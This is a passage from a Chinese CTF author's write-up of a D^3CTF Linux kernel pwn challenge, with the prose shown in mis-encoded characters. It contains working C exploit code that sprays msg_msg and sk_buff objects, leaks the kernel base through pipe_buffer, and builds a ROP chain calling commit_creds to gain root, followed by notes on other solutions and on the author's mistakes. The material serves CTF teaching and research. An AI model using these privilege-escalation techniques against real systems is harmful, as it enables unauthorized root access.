class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼ŒæˆåŠŸç‡æ¯”ç¬”è€…æœ€åˆæ‹è„‘é—¨æƒ³çš„è§£æ³•è¦é«˜å¾—å¤šXD</p><p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p><h1 id="0x03-å…¶ä»–çš„é¢„æœŸè§£"><a href="#0x03-å…¶ä»–çš„é¢„æœŸè§£" class="headerlink" title="0x03.å…¶ä»–çš„é¢„æœŸè§£"></a>0x03.å…¶ä»–çš„é¢„æœŸè§£</h1><p>é™¤äº†ç¬”è€…çš„å®˜æ–¹è§£æ³•ä»¥å¤–ï¼Œç¬”è€…è®¤ä¸ºä»¥ä¸‹æ–¹æ³•åº”å½“ä¹Ÿèƒ½è§£å¼€æœ¬é¢˜ï¼ˆç¬”è€…æœªè¿›è¡Œå°è¯•ï¼‰ï¼š</p><ul><li>ç”±äºæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¯ç›´æ¥åœ¨å†…å­˜ä¸­çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æœç´¢å†…å­˜å¯»æ‰¾ flagï¼ˆç¬”è€…æœ¬äººå¹¶ä¸æ¨èè¿™ç§ä¸“æ³¨äº flag æœ¬èº«çš„è§£æ³•ï¼‰</li><li>ç›´æ¥åˆ†é…å…¶ä»–å¯ä»¥åŠ«æŒ RIP çš„ç»“æ„ä½“ï¼Œç„¶åçˆ†ç ´å†…æ ¸ .text æ®µåç§»ï¼Œåœ¨ pt_regs ä¸Šæ„é€  ROP</li><li>slub å¤§å¸ˆé€šè¿‡å·§å¦™æ„é€ æ³„éœ²å‡º cookie ä¸å †ä¸Šåœ°å€ï¼Œç„¶ååŠ«æŒ freelistï¼ˆç¬”è€…æœ‰æ€è·¯ä½†ç¬”è€…è®¤ä¸ºè¿™ç§è§£æ³•è¿‡äºéº»çƒ¦ + æ²¡æœ‰å¿…è¦ï¼‰<ul><li>æ³„éœ²å‡ºå†…æ ¸åŸºå€ååå†™ä¸€äº›å…¨å±€æŒ‡é’ˆï¼ˆä¾‹å¦‚ <code>n_tty_ops</code>ï¼‰</li><li>åˆ©ç”¨ prctl ä¿®æ”¹ current_task çš„ comm æˆå‘˜ï¼Œæš´åŠ›æœç´¢å†…å­˜æ‰¾åˆ° cred</li></ul></li><li>å°† double free åº”ç”¨åˆ°å…¶ä»–çš„ç»“æ„ä½“ä¸Šï¼Œä½¿å…¶è½¬æ¢ä¸ºä¸€ä¸ªå·²çŸ¥çš„ CVE åç›´æ¥æ‰“</li><li>åˆ©ç”¨ 0day æˆ–æ˜¯ï¼ˆç¬”è€…ä¸çŸ¥é“çš„ï¼‰ 1day ç›´æ¥æ‰“ kernel</li></ul><h1 id="0x04-è§£é¢˜æƒ…å†µä¸éé¢„æœŸ"><a href="#0x04-è§£é¢˜æƒ…å†µä¸éé¢„æœŸ" class="headerlink" title="0x04.è§£é¢˜æƒ…å†µä¸éé¢„æœŸ"></a>0x04.è§£é¢˜æƒ…å†µä¸éé¢„æœŸ</h1><p>è¿™ä¸€æ¬¡çš„ D^3CTF ä¸­ç¬”è€…çš„é¢˜æ˜¯ç¬¬äºŒæ‰¹æ”¾å‡ºçš„ï¼Œä½†åœ¨ç¬”è€…æ”¾å‡ºé¢˜ç›®åä¸ä¹…ä¾¿è¢« W&amp;M æˆ˜é˜Ÿæ‹¿ä¸‹äº†ä¸€è¡€ï¼Œè€Œæ•´ä¸ªæ¯”èµ›ä¸­è§£å‡ºäº†è¿™é“é¢˜ç›®çš„é˜Ÿä¼ä¹Ÿè¾¾åˆ°äº† 8 æ”¯ä¹‹å¤šï¼Œç¬”è€…åŸä»¥ä¸ºæ˜¯è‡ªèº«å‡ºé¢˜æ°´å‡†ä¸è¶³ä»¥è‡³äºå‡ºçš„é¢˜ç›®åªæœ‰ç­¾åˆ°é¢˜æ°´å¹³äºæ˜¯è¢«å„å¤§æˆ˜é˜Ÿç§’æ€ï¼ˆè™½ç„¶ç¬”è€…æœ¬èº«å°±å¾ˆèœï¼‰ï¼Œä½†äº‹æƒ…å¾€å¾€æ²¡æœ‰ç¬”è€…æ‰€æƒ³çš„é‚£ä¹ˆç®€å•</p><p>åœ¨æ¯”èµ›ç»“æŸæ—¶ï¼Œæˆ‘ä»¬å‘æ”¾äº†ä¸€ä»½è°ƒæŸ¥é—®å·ï¼Œè€Œç¬”è€…åœ¨å…¶ä¸­çœ‹åˆ°äº†ä¸€æ¡å¯¹ç¬”è€…é¢˜ç›®çš„è¯„ä»·â€”â€”</p><p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p><p>ç¬”è€…åœ¨çœ‹åˆ°è¿™æ¡æ¶ˆæ¯ä¹‹åæ•´ä¸ªå¤§è„‘ä¸€ç‰‡ç©ºç™½ï¼Œé©¬ä¸Šä»æ¯”èµ›å¹³å°ä¸Šä¸‹è½½ä¸‹æ¥é¢˜ç›®é™„ä»¶ï¼Œè§£å‹ï¼Œæœç„¶åœ¨ <code>/tmp</code> ç›®å½•ä¸‹çœ‹åˆ°äº†ä¸€ä¸ªç†Ÿæ‚‰çš„ <code>exp</code> æ–‡ä»¶â€¦</p><p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p><p>èµ›åç¬”è€…æŸ¥é˜…é€‰æ‰‹ä»¬çš„ wpï¼Œ<strong>ç¡®ä¹æ˜¯æœ‰ä¸€åŠçš„é˜Ÿä¼åˆ©ç”¨ç¬”è€…ç•™ä¸‹æ¥çš„ exp è§£å‡ºäº†è¿™é“é¢˜</strong>ï¼Œè¿™ä¹Ÿä»¤è¿™é“é¢˜çš„åšé¢˜ä½“éªŒå¤§æ‰“æŠ˜æ‰£ï¼Œåœ¨è¿™é‡Œç¬”è€…å‘å¤§å®¶çŒ®ä¸Šæœ€è¯šæŒšçš„æ­‰æ„ğŸ™‡ğŸ½â€â™‚ï¸ğŸ™‡ğŸ½â€â™‚ï¸ğŸ™‡ğŸ½â€â™‚ï¸ï¼ï¼ï¼</p><p>ä¸è¿‡æ¯”è¾ƒå¹¸è¿çš„ä¸€ç‚¹æ˜¯ç¬”è€…æœ¬åœ°æµ‹è¯•æ—¶æ˜¯ç›´æ¥åœ¨æ ¹ç›®å½•ä¸‹æµ‹è¯•çš„ï¼Œå› æ­¤ setxattr çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>/exp</code>ï¼Œè€Œå¯¹äºè¿œç¨‹ç¯å¢ƒè€Œè¨€æ ¹ç›®å½•å¯¹é€‰æ‰‹æ˜¯ä¸å¯å†™çš„ï¼Œé€‰æ‰‹çš„ exp è·¯å¾„åº”å½“ä¸º <code>/tmp/exp</code>ï¼Œè¿™ä¹Ÿè®©è¿™ä¸ª exp æ— æ³•è¢«ç›´æ¥æ‰“é€šï¼ˆå¦åˆ™å¯èƒ½è§£é¢˜é˜Ÿä¼æ•°é‡è¿˜å¾—ç¿»ä¸ªæ•°åå€â€¦ï¼‰ï¼Œä¸è¿‡é€‰æ‰‹ä»å¯ä»¥é€†å‘å‡º exp é€»è¾‘åè¿›è¡Œä¿®æ”¹</p><p>wp ä¸­åªæœ‰å››æ”¯é˜Ÿä¼æ˜¯æ­£å¸¸åšé¢˜çš„ï¼Œè§£æ³•åŸºæœ¬ä¸Šéƒ½æ˜¯é¢„æœŸè§£â€”â€”ä½¿ç”¨ <code>msg_msg</code> æ³„éœ²ä¿¡æ¯ä¸ <code>pipe_buffer</code> åŠ«æŒ RIPï¼Œä¸è¿‡éƒ½æ¯”ç¬”è€…è¿™ä¸ªç¬¨æ‹™çš„è§£æ³•è¦ä¼˜ç§€ä¸Šè®¸å¤šï¼ˆç¬‘ï¼‰ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥å½’ä¸ºä¸¤ç§é¢˜è§£ï¼š</p><ul><li>å–·å°„ pipe_buffer ä¸ sk_buffï¼Œå‚ç…§ CVE-2021-22555 çš„è§£æ³•å®Œæˆè§£é¢˜ï¼ˆ3æ”¯é˜Ÿä¼ï¼‰</li><li>å–·å°„å¤§é‡ pipe_buffer åç›´æ¥ç”¨ setxattr ä¿®æ”¹ msg_msg è¶Šç•Œè¯»æ³„éœ²å‡º kernel baseï¼Œä¿®æ”¹ msg_msg-&gt;next åˆ° <code>vmemmap_base</code> å‰ 8 å­—èŠ‚ï¼ˆåˆšå¥½ä¸º NULLï¼‰ï¼Œè¿™ä¸ªåœ°æ–¹å­˜æ”¾äº†å‡ ä¸ªå…¨å±€å˜é‡ï¼ˆæŒ‡å‘ <code>vmemmap_base</code>ã€<code>vmalloc_base</code>ã€<code>page_offset_base</code> çš„æŒ‡é’ˆç­‰éƒ½åœ¨è¿™é‡Œï¼‰ï¼Œè¯»å‡ºâ€œå †åŸºå€â€åç”¨ä¸€ä¸ªå †ä¸Šåœ°å€ä¿®å¤ msg_msg çš„ headerï¼Œç„¶ååŠ«æŒ pipe_bufferã€‚è¿™ä¸ªè§£æ³•å’Œç¬”è€…çš„è§£æ³•åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„</li></ul><p>ç¬”è€…åœ¨å‡ºé¢˜è¿‡ç¨‹ä¸­å…¶å®ä¹Ÿçœ‹åˆ°äº† CVE-2021-22555ï¼Œè¿™ä¸ªæ¼æ´æœ¬èº«æ˜¯ä¸€ä¸ª off-by-nullï¼Œæœ€åè½¬åŒ–ä¸ºä¸€ä¸ª UAF è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤ä¸ç¬”è€…çš„è¿™é“é¢˜æœ€ç»ˆæ˜¯å¯ä»¥æ®Šé€”åŒå½’çš„ï¼Œäº‹å®è¯æ˜æ­£å¸¸è§£é¢˜çš„é˜Ÿä¼åŸºæœ¬ä¸Šéƒ½å‚ç…§äº†è¿™ä¸ªæ¼æ´ï¼ˆç¬‘ï¼‰ï¼Œä¸è¿‡ç¬”è€…è¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿæ¢ç´¢å‡ºä¸€æ¡åˆ«çš„é“è·¯ï¼Œæ‰€ä»¥ä½ åœ¨ä¸Šé¢çœ‹åˆ°çš„ç¬”è€…çš„è§£æ³•å…¶å®ä¸è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹å¹¶éæ˜¯å®Œå…¨ä¸€æ ·çš„</p><blockquote><p>å¤–å›½å‹äººå¯¹æœ¬é¢˜çš„è¯„ä»·ï¼š</p><blockquote><p>This is a standard kernel pwn challenge. We are given an unprivileged shell in a Linux VM, and the flag can only be read by root. The VM loads a vulnerable kernel module, which we have to exploit to gain root privileges and read the flag.</p></blockquote><p>è¯´å®è¯è¿™ä¸€æ¬¡å‡ºé¢˜ç¡®å®è¿˜æ˜¯æ¯”è¾ƒå¸¸è§„ï¼Œå¸Œæœ›ç¬”è€…æ˜å¹´èƒ½å¤Ÿæƒ³åˆ°ä¸€äº›æ›´å¥½çš„ä¸œè¥¿XD</p></blockquote><h1 id="0x05-æ€»ç»“ä¸åæ€"><a href="#0x05-æ€»ç»“ä¸åæ€" class="headerlink" title="0x05.æ€»ç»“ä¸åæ€"></a>0x05.æ€»ç»“ä¸åæ€</h1><p>è™½ç„¶åœ¨å®˜æ–¹è§£æ³•ä¸­ä½¿ç”¨äº†â€œçœ‹ä¼¼éå¸¸é€šç”¨çš„è§£æ³•â€è§£å‡ºäº†è¿™é“é¢˜ï¼Œä½†ç¬”è€…å…¶å®æ˜¯ä¸å¤ªæ»¡æ„çš„ï¼š</p><ul><li>è¯¥æ–¹æ³•ä»…é€‚ç”¨äºè¾ƒå¤§çš„ objectï¼Œå¯¹äºå°ä¸€ç‚¹çš„ object æˆ–è€… kmem_cache-&gt;offset ä¸º 0 çš„æƒ…å†µåˆ™<strong>å¾ˆå®¹æ˜“è®©æˆ‘ä»¬æ— æ³•ä¿®å¤ msg_msgï¼Œç”šè‡³å°±æ— æ³•åˆ†é… msg_msg</strong> ï¼ˆå°äº 0x30 çš„æƒ…å†µï¼‰</li><li>åœ¨åŠ«æŒ RIP çš„è¿‡ç¨‹å½“ä¸­<strong>ä»ç„¶éœ€è¦æ ¹æ® object å¤§å°å»æ‰¾å¯¹åº”çš„å¯ç”¨ç»“æ„ä½“</strong>ï¼Œè€Œæ²¡æœ‰ä¸€ä¸ªæ›´åŠ <strong>é€šç”¨</strong>çš„åŠ«æŒæ§åˆ¶æµçš„åŠæ³•ï¼Œè¿™æ— ç–‘é€ æˆäº†ç›¸å½“ç¨‹åº¦çš„é™åˆ¶</li><li>å¯¹äºç‹¬ç«‹çš„ kmem_cache è€Œè¨€<strong>æ— æ³•ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œåˆ©ç”¨</strong>ï¼Œå› ä¸ºæ­¤æ—¶ msg_msg ä¸ä»è¯¥å¤„åˆ†é…</li><li><strong>çœŸå®ç¯å¢ƒä¸­åœ¨è¿›è¡Œå†…å­˜åˆ†é…çš„å¹¶éåªæœ‰æˆ‘ä»¬</strong>ï¼Œå¾ˆå®¹æ˜“è¢«å…¶ä»–è¿›ç¨‹æ‹¿åˆ° freelist é€ æˆ kernel panic</li><li>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹å¹¶ä¸èƒ½åœ¨æ³› Linux å¹³å°ä¸Šé€šç”¨ï¼ˆæ®æ‚‰ Android å¹¶ä¸èƒ½ä½¿ç”¨è¿™ä¸€å¥— IPC APIï¼Œç¬”è€…å°šæœªæŸ¥è¯ï¼‰</li></ul><p>å› æ­¤ç¬”è€…è®¤ä¸ºè¿™é“é¢˜ç›®å……å…¶é‡èƒ½åœ¨ D3CTF è¿™ä¸€æ¡£æ¬¡çš„æ¯”èµ›ä¸­å……å½“ç­¾åˆ°é¢˜ï¼Œä½†ç¬”è€…è¿˜æ˜¯å¸Œæœ›ç¬”è€…å¯¹â€œé€šè§£â€çš„æ¢ç´¢èƒ½å¤Ÿç»™å¤§å®¶å¸¦æ¥ä¸€äº›æ–°çš„æ€è€ƒï¼ˆç¬‘ï¼‰</p><p>åœ¨å‡ºé¢˜è¿‡ç¨‹å½“ä¸­è¿˜é‡åˆ°äº†è¿™æ ·çš„é—®é¢˜ï¼ŒåŸå› æš‚ä¸”ä¸æ˜ï¼Œä¹Ÿå¸Œæœ›äº†è§£å…¶ç»†èŠ‚çš„å¤§å¸ˆå‚…ä¸åèµæ•™ï¼š</p><ul><li>ç¬”è€…æƒ¯ç”¨çš„æ‰‹æ³•æ˜¯åˆ©ç”¨ <code>pt_regs</code> ç»“æ„ä½“æ„é€  ROPï¼Œæ§åˆ¶æ ˆè¿ç§»åˆ°æ­¤å¤„ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­<strong>æ¯æ¬¡åŠ«æŒ RIP æ—¶å†…æ ¸æ ˆé¡¶åˆ°æ ˆåº•çš„ç›¸å¯¹åç§»éƒ½å¹¶éä¸€å›ºå®šå€¼</strong>ï¼Œå› æ­¤ç¬”è€…åªå¥½ç”¨ä¼ ç»Ÿçš„å †ä¸Š ROP æ–¹å¼ï¼Œç¬”è€…æš‚ä¸”ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆåŸå› é€ æˆäº†<strong>åç§»å€¼ä¸å›ºå®š</strong>çš„æƒ…å†µçš„å‡ºç°</li><li>å¯¹äº 5.14 åŠå¾€ä¸Šç‰ˆæœ¬çš„å†…æ ¸ï¼Œ<strong>setxattr ä¸ msgsnd ä¸ä¼šä»åŒä¸€å¼  slub ä¸Šå– object</strong>ï¼ˆä¸€ä¸ªæ˜¯ <code>GFP_KERNEL_ACCOUNT</code> è€Œå¦ä¸€ä¸ªæ˜¯ <code>GPF_KERNEL</code>ï¼Œä½†è¿™ä¸¤ä¸ª flag åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä¼¼ä¹å¹¶ä¸ä¼šé€ æˆ slub 